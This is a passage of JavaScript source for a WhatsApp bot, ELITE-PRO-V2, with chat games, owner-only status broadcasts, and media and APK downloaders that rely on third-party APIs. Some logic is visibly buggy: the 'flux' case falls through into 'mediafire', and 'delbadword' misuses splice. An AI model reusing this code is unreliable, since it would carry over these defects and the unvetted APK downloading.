                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) EliteProEmpire.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            EliteProEmpire.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    EliteProEmpire.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    EliteProEmpire.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) EliteProEmpire.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) EliteProEmpire.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) EliteProEmpire.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    EliteProEmpire.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) EliteProEmpire.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) EliteProEmpire.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    EliteProEmpire.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, null, 2))
}
        
        switch (isCommand) {
            case 'addbadword': case 'addbd':
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!groupAdmins) return reply(mess.admin)
               if (args.length < 1) return reply( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               reply('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!groupAdmins) return reply(mess.admin)
               if (args.length < 1) return reply( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               reply('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               let totalusernya = db.data.users[0]
               reply(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               global.db.data.settings[botNumber].totalhit = 0
               reply(mess.done)
            }
            break
            case 'setmenu':{
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!text) return reply(`There are 9 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  reply(mess.done)
               } else {
                  reply(`There are 9 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
            case 'setreply':{
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!text) return reply(`There are 4 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
               if (text.startsWith('v')) {
                  typereply = text
                  reply(mess.done)
               } else {
                  reply(`There are 4 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
               }
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (!q) return reply('Text?')
               await EliteProEmpire.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (/video/.test(mime)) {
                  var videosw = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                  await EliteProEmpire.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await reply(mess.done)
               } else {
                  reply('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (/image/.test(mime)) {
                  var imagesw = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                  await EliteProEmpire.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await reply(mess.done)
               } else {
                  reply('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (/audio/.test(mime)) {
                  var audiosw = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                  await EliteProEmpire.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await reply(mess.done)
               } else {
                  reply('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './EliteProMedia/theme/elitepro.jpg')
                fs.unlinkSync(delb)
                reply(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './EliteProMedia/theme/Elite-Pro.mp4')
                fs.unlinkSync(delb)
                reply(mess.done)
            }
//Chinedu-MD Codes. All Chinedu-MD codes will be added at this point...
//Command for ping
 break
 case 'ping':
let timestampe = speed()
let latensie = speed() - timestampe   
 await EliteProEmpire.sendMessage(m.chat, { react: { text: "🚀",key: m.key,}})
 EliteProEmpire.sendMessage(m.chat, {
 text: `*${pushname}, bot is currently active 🚀*`,
     contextInfo: {
forwardingScore: 2025,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "ELITE-PRO-V2",
newsletterJid: "120363287352245413@newsletter",},
     externalAdReply: {
     showAdAttribution: true,
     title: `${botname}`,
     body: `ʙᴏᴛ ɪꜱ ᴘɪɴɢɪɴɢ: ${latensie.toFixed(4)} ᴍꜱ 🚀🚀🚀`,
     thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
     sourceUrl: wagc,
     mediaType: 1,
     renderLargerThumbnail: false
   }
 }
 }, {
   quoted: m
 })
 
//Command for flux
break
case 'flux':{
  if (!text) return reply(`*Prefix* flux Cat\n\n*Example:* .flux cat`);
}

try {

    const apiUrl = `https://apis.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
 await EliteProEmpire.sendMessage(m.chat, {
      image: { url: apiUrl },
      caption: `👨‍💻 *Flux Image Generator*\n\n📦 *Prompt:* ${text}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`,
    }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
  }
//Commands for mediafire 
  case 'mediafire': {
    if (!text) return reply(`*Example*: ${prefix + command} https://www.mediafire.com/file/rmpx6iv7kiboki3/ELITEPRO-master+(2).zip/file`);

    try {
        
        await EliteProEmpire.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });


        const apiUrl = `https://apis.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

    
        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;


            await EliteProEmpire.sendMessage(m.chat, {
                document: { url: downloadLink },
                mimetype: mimeType,
                fileName: fileName,
                caption: `📦 *File Name:* ${fileName}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
            }, { quoted: m });
        } else {

            reply(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {

        console.error('Error during MediaFire command:', error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
//Play commands 
case 'ytmp3': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);
  
  try {
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🎵`, key: m.key } });
    
    const yts = require("yt-search");
    const axios = require("axios");
    
    const search = await yts(text);
    const video = search.videos[0];
    
    if (!video) {
      return reply(`*No results found for:* ${text}`);
    }
    
    const body = `*ELITE-PRO-V2_MUSIC - PLAYER*\n` +
      `> *ᴛɪᴛʟᴇ:* ${video.title}\n` +
      `> *ᴠɪᴇᴡꜱ:* ${video.views}\n` +
      `> *ᴅᴜʀᴀᴛɪᴏɴ:* ${video.timestamp}\n` +
      `> *ᴜᴘʟᴏᴀᴅᴇᴅ:* ${video.ago}\n` +
      `> *ᴜʀʟ:* ${video.url}\n` +
      `> *Enjoy your music®*\n` +
      `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;
    
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption: body
    }, { quoted: m });
    
    // Construct the API URL
    const apiUrl = `https://apis.giftedtech.web.id/api/download/dlmp3?apikey=gifted&url=${encodeURIComponent(video.url)}`;
    
    // Fetch the response from the API
    const apiResponse = await axios.get(apiUrl);
    
    // Check if the API response is successful and has the expected structure
    if (apiResponse.data && apiResponse.data.result && apiResponse.data.result.download_url) {
      const download_url = apiResponse.data.result.download_url;
      const title = apiResponse.data.result.title;
      
      // Download the audio buffer
      const audioResponse = await axios.get(download_url, { responseType: 'arraybuffer' });
      
      await EliteProEmpire.sendMessage(m.chat, {
        audio: audioResponse.data,
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`
      }, { quoted: m });
      
    } else {
      reply(`*Failed to fetch the song! Please try again later.*`);
    }
    
  } catch (error) {
    console.error('Error during /play command:', error.message);
    reply(`*An error occurred while processing your request. Please try again later.*`);
  }
  break;
}
case 'play': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);
  
  try {
    // React to the play command
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🎵`, key: m.key } });
    
    // YouTube search
    const yts = require("yt-search");
    const search = await yts(text);
    const video = search.videos[0];
    
    if (!video) {
      return reply(`*No results found for:* ${text}`);
    }
    
    // Construct message body
    const body = `*ELITE-PRO-V2_MUSIC - PLAYER*\n` +
      `> *ᴛɪᴛʟᴇ:* ${video.title}\n` +
      `> *ᴠɪᴇᴡꜱ:* ${video.views}\n` +
      `> *ᴅᴜʀᴀᴛɪᴏɴ:* ${video.timestamp}\n` +
      `> *ᴜᴘʟᴏᴀᴅᴇᴅ:* ${video.ago}\n` +
      `> *ᴜʀʟ:* ${video.url}\n` +
      `> *Enjoy your Music®*\n` +
      `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;
    
    // Send video information with thumbnail
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption: body
    }, { quoted: m });
    
    // Download the audio using the API
    const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;
    const apiResponse = await axios.get(apiUrl);
    
    // Check for successful response
    if (apiResponse.data?.success && apiResponse.data?.result?.download_url) {
      const { download_url, title } = apiResponse.data.result;
      
      // Send the audio file
      await EliteProEmpire.sendMessage(m.chat, {
        audio: { url: download_url },
        mimetype: 'audio/mpeg', // Changed to 'audio/mpeg' for MP3 files
        fileName: `${title}.mp3`,
        caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
      }, { quoted: m });
    } else {
      reply(`*Failed to fetch the song! Please try again later.*`);
      console.error('API Response Error:', apiResponse.data);
    }
  } catch (error) {
    console.error('Error during /play command:', error.message);
    reply(`*An error occurred while processing your request. Please try ${prefix + command}ytmp3*`);
  }
  break;
}
//Video downloader 
case 'ytmp4': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);
  
  try {
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });
    
    const yts = require("yt-search");
    let search = await yts(text);
    let video = search.all[0];
    
    let body = `*ELITE-PRO-V2_VIDEO - PLAYER*\n` +
      `> *ᴛɪᴛʟᴇ:* ${video.title}\n` +
      `> *ᴠɪᴇᴡꜱ:* ${video.views}\n` +
      `> *ᴅᴜʀᴀᴛɪᴏɴ:* ${video.timestamp}\n` +
      `> *ᴜᴘʟᴏᴀᴅᴇᴅ:* ${video.ago}\n` +
      `> *ᴜʀʟ:* ${video.url}\n` +
      `> *Enjoy your video®*\n` +
      `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;
    
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption: body
    }, { quoted: m });
    
    // API URL for video download
    const apiUrl = `https://api.agatz.xyz/api/ytmp4?url=${encodeURIComponent(video.url)}`;
    
    // Fetching the video download link
    const apiResponse = await axios.get(apiUrl);
    
    // Check if API response contains the download URL
    const downloadUrl = apiResponse.data?.data?.downloadUrl;
    
    if (downloadUrl) {
      // Send the video file directly
      await EliteProEmpire.sendMessage(m.chat, {
        video: { url: downloadUrl },
        mimetype: 'video/mp4',
        caption: `🎬 *Title:* ${video.title}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
      }, { quoted: m });
    } else {
      reply(`*An error occurred while downloading the video.*`);
    }
  } catch (error) {
    reply(`*An error occurred while processing your request.*`);
  }
  break;
}
case 'video': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);
  
  try {
    
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });
    
    
    const yts = require("yt-search");
    let search = await yts(text);
    let video = search.all[0];
    
    let body = `*ELITE-PRO-V2_VIDEO - PLAYER*\n` +
      `> *ᴛɪᴛʟᴇ:* ${video.title}\n` +
      `> *ᴠɪᴇᴡꜱ:* ${video.views}\n` +
      `> *ᴅᴜʀᴀᴛɪᴏɴ:* ${video.timestamp}\n` +
      `> *ᴜᴘʟᴏᴀᴅᴇᴅ:* ${video.ago}\n` +
      `> *ᴜʀʟ:* ${video.url}\n` +
      `> *Enjoy your video®*\n` +
      `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`;
    
    
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: video.thumbnail },
      caption: body
    }, { quoted: m });
    
    
    const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4`;
    const apiResponse = await axios.get(apiUrl, {
      params: { url: video.url }
    });
    
    
    if (apiResponse.data.success) {
      const { title, download_url } = apiResponse.data.result;
      
      // Send the video file directly
      await EliteProEmpire.sendMessage(m.chat, {
        video: { url: download_url },
        mimetype: 'video/mp4',
        caption: `🎬 *Title:* ${title}\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
      }, { quoted: m });
    } else {
      reply(`*Error fetching the video! Please try again later.*`);
    }
  } catch (error) {
    console.error('Error during video command:', error);
    reply(`*An error occurred while processing your request. Please try ytmp4*`);
  }
  break;
}
//Facebook Ig tiktok
case 'tiktok':
case 'facebook':
case 'aio':
case 'instagram': {
  if (!text) return reply(`Give Me A Video Link \n\n*Example:* ${prefix + command} https://www.facebook.com/reel/123456`);
  await EliteProEmpire.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });

  try {


    const apiUrl = `https://apis.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl);

    if (response.data.success) {
      const { title, low_quality, high_quality } = response.data.video;

      const isDirectDownloadHD = high_quality.includes("tinyurl");
      const isDirectDownloadSD = low_quality.includes("tinyurl");

      if (isDirectDownloadHD || isDirectDownloadSD) {
        if (isDirectDownloadHD) {
          await EliteProEmpire.sendMessage(m.chat, {
            video: { url: high_quality },
            mimetype: 'video/mp4',
            fileName: `${title}_HD.mp4`,
            caption: `🎥 *Title:* ${title}\n*Quality:* HD\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
          }, { quoted: m });
        }
        if (isDirectDownloadSD) {
          await EliteProEmpire.sendMessage(m.chat, {
            video: { url: low_quality },
            mimetype: 'video/mp4',
            fileName: `${title}_SD.mp4`,
            caption: `🎥 *Title:* ${title}\n*Quality:* SD\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
          }, { quoted: m });
        }
      } else {
        await EliteProEmpire.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });


        const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
        const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });

        if (high_quality) {
          await EliteProEmpire.sendMessage(m.chat, {
            video: Buffer.from(hdBuffer.data),
            mimetype: 'video/mp4',
            fileName: `${title}_HD.mp4`,
            caption: `🎥 *Title:* ${title}\n*Quality:* HD\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
          }, { quoted: m });
        }
        if (low_quality) {
          await EliteProEmpire.sendMessage(m.chat, {
            video: Buffer.from(sdBuffer.data),
            mimetype: 'video/mp4',
            fileName: `${title}_SD.mp4`,
            caption: `🎥 *Title:* ${title}\n*Quality:* SD\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
          }, { quoted: m });
        }
      }
    } else {
      reply("❌ Unable to fetch the video. Please check the URL and try again.");
    }
  } catch (error) {
    console.error('Error in AIO Downloader:', error.message);
    reply("❌ An error occurred while processing your request. Please try again later.");
  }
  break;
}
//Cmd for profile picture 
case 'getpp': {
    let target;

    // If in a private chat, get the other person's profile picture
    if (!m.isGroup) {
        target = m.chat; // The person you are chatting with in private
    }
    // If user mentions someone, get their profile picture
    else if (m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo.mentionedJid) {
        target = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
    }
    // If user provides a number (for private chat)
    else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Convert number to JID format
    }
    // Otherwise, get sender's own profile picture
    else {
        target = m.sender;
    }

    let username = target.split('@')[0];
    let profileCaption = `*@${username} profile picture*`;

    try {
        ppuser = await EliteProEmpire.profilePictureUrl(target, 'image');
    } catch (err) {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'; // Default profile picture
    }

    ppxeon = await getBuffer(ppuser);

    EliteProEmpire.sendMessage(from, { 
        image: ppxeon, 
        caption: profileCaption, 
        mentions: [target] 
    }, { quoted: m });
}
break;


//Screenshot of Website
break
case 'ss': case 'ssweb': {
  if (!args[0]) return m.reply(`Please provide a link\n\n Example: ${prefix + command}.`);
  await EliteProEmpire.sendMessage(m?.chat, { react: { text: `📸`, key: m?.key } });

  let apiUrl = `https://apis.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(args[0])}`;

  try {
    await EliteProEmpire.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🖼️ Screenshot of ${args[0]}` }, { quoted: m });
  } catch (error) {
    console.error(error);
    m.reply('Failed to capture the screenshot. Please try again later.');
  }
  break;
}
break
case 'deploy':
EliteProEmpire.sendMessage(m.chat, {
  text: `
*HOW TO DEPLOY ELITEPRO BOT*
*Create a GitHub account*
Link: https://github.com/

*Fork any of the repository* 
Link: https://github.com/elite-md/ELITEPRO
Link2: https://github.com/elite-md/ELITE-PRO-V2
watch: https://youtu.be/P2YUcGTkhPo?si=aC2FQWFfz_ZE1A9q
Don't forget to star 🌟 my repository.
watch: https://youtu.be/deO4dqb3A8c?si=btnABc8-sIjx9WAL
*Get Session using session link*
https://elitepro-pairing-code.onrender.com

*Create a discord account*
Link: https://discord.com/login
when your done creating and verifying account 
Click this link to Authorize account
Link: https://bot-hosting.net/
Claim coin there

Create a server with any name
Upload file there
watch: https://youtu.be/i4vjuO1CEkA?si=4bLm25C_ULuKrTnH
`,
   contextInfo: {
forwardingScore: 2025,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "ELITE-PRO-V2",
newsletterJid: "120363287352245413@newsletter",},     
    externalAdReply: {
    showAdAttribution: true,
    title: `${botname}`,
    body: `Every thing is well explained here`,
    thumbnailUrl: 'https://i.ibb.co/CNFGVhK/20250204-154801.jpg',
    sourceUrl: wagc,
    mediaType: 1,
    renderLargerThumbnail: false
  }
}
}, {
  quoted: m
})
break
case 'panel':
EliteProEmpire.sendMessage(m.chat, {
  text: `
*FREE PANEL FOR HOSTING BOT*
- https://account.solarhosting.cc/
- https://my.blare.host/
- https://dash.witchly.host/
- https://optiklink.com/
- https://panel.sillydev.co.uk
- https://cloves.mypi.co/
- https://client.botwa.net/login
- https://netherite.io/
- https://bot-hosting.net/
- https://panel.hardy.host/auth/login
- https://dashboard.katabump.com/auth/login
- https://daki.cc
- https://pella.app

*Tᴏᴘ ᴡᴇʙʜᴏsᴛɪɴɢ sᴇʀᴠᴇʀs 2025*
- https: //Freehostia.com
- https: //ZettaHost.com
- https: //110MB.com
- https: //Jimdo.com
- https: //Byethost.com
- https: //HostFakeNow.com
- https: //Zymic.com
- https: //FreeHosting.com
- https: //PhantomHost.io
- https: //xtreemhost.com
- https: //Reliefhost.com
- https: //AwardSpace.com
- https: //FreeHostingEU.com
- https: //InstantHostX.com 
- https: //Uhostfull.com
- https: //1ClickWebHost.com 
- https: //SuperFreeHost.com 
- https: //FreeWorldHosting.net
- https: //000webhost.com
- https: //x10hosting.com
- https: //UptimeUnlimited.io
- https: //1FreeHosting.com
- https: //50Webs.com
- https: //MythicHosting.com
`,
    contextInfo: {
forwardingScore: 2025,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "ELITE-PRO-V2",
newsletterJid: "120363287352245413@newsletter",},    externalAdReply: {
      showAdAttribution: true,
      title: `${botname}`,
      body: `Click here for latest panel details`,
      thumbnailUrl: 'https://i.ibb.co/5WjxsP0G/20250206-003158.jpg',
      sourceUrl: wagc,
      mediaType: 1,
      renderLargerThumbnail: true
    }
  }
  }, {
    quoted: m
  })
//Code for downloading apps
break
case 'apk': {
  if (!text) return reply(`*Example:* ${prefix + command} WhatsApp`);

  try {
    const apiUrl = `https://apis.davidcyriltech.my.id/download/apk?text=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl, { timeout: 10000 });

    // Validate API response
    if (!response.data || !response.data.success) {
      return reply('❌ *Failed to fetch APK. Try again later.*');
    }

    const { apk_name, thumbnail, download_link } = response.data;

    // Send APK details with thumbnail
    await EliteProEmpire.sendMessage(m.chat, {
      image: { url: thumbnail },
      caption: `📥 *APK Downloader* 📥\n` +
        `📌 *Name:* ${apk_name}\n` +
        `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇᴘʀᴏ*`
    }, { quoted: m });

    // Send APK file immediately after
    await EliteProEmpire.sendMessage(m.chat, {
      document: { url: download_link },
      mimetype: 'application/vnd.android.package-archive',
      fileName: `${apk_name}.apk`
    }, { quoted: m }).catch(err => {
      console.error('Error sending APK:', err);
      reply('❌ *Failed to send APK file. It might be too large or restricted by WhatsApp.*');
    });

  } catch (error) {
    console.error('Error in APK Downloader:', error?.response?.data || error.message);

    // Handle specific errors
    if (error.code === 'ECONNABORTED') {
      reply('⚠️ *API request timed out. Please try again.*');
    } else if (error.response && error.response.status === 404) {
      reply('❌ *APK not found. Please check the name and try again.*');
    } else {
      reply('❌ *An unexpected error occurred. Try again later.*');
    }
  }

  break;
}
case 'alive': {
  await EliteProEmpire.sendMessage(m.chat, {
    react: { text: "🎶", key: m.key }
  });
  
  try {
    // Fetch music URLs from API
    const response = await fetch('https://raw.githubusercontent.com/Cyrilix-XMD/cyrilix-store/refs/heads/main/music-url.json');
    const data = await response.json();
    
    if (!data || data.length === 0) {
      throw new Error("No music found in API.");
    }
    
    // Select a random audio from the API response
    const randomAudio = data[Math.floor(Math.random() * data.length)];
    
    EliteProEmpire.sendMessage(m.chat, {
      audio: { url: randomAudio }, // Sends a random audio file
      mimetype: 'audio/mp4',
      ptt: true, // Set to true for voice note style
      contextInfo: {
forwardingScore: 999,
 isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterName: "ELITE-PRO-V2",
    newsletterJid: "120363287352245413@newsletter",
  },        
        externalAdReply: {
          showAdAttribution: true,
          title: "Message: ELITEPRO IS ALIVE",
          body: "Tap here to join our channel",
          thumbnailUrl: 'https://i.ibb.co/CNFGVhK/20250204-154801.jpg', // Replace with your thumbnail URL
          sourceUrl: wagc, // Replace with your channel link
          mediaType: 1,
          renderLargerThumbnail: false
        }
      }
    });
    
  } catch (error) {
    console.error("Error fetching music:", error);
    reply("❌ Failed to get music from API.");
  }
  break;
}
//Song commands 
case 'song': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);
  
  try {
    await EliteProEmpire.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
    
    const yts = require("yt-search");
    const axios = require("axios");
    
    const search = await yts(text);
    const video = search.videos[0];
    
    if (!video) {
      return reply(`*No results found for:* ${text}`);
    }
    
    const body = `*ELITE-PRO-V2_MUSIC - PLAYER*\n` +
      `> *ᴛɪᴛʟᴇ:* ${video.title}\n` +
      `> *ᴠɪᴇᴡꜱ:* ${video.views}\n` +
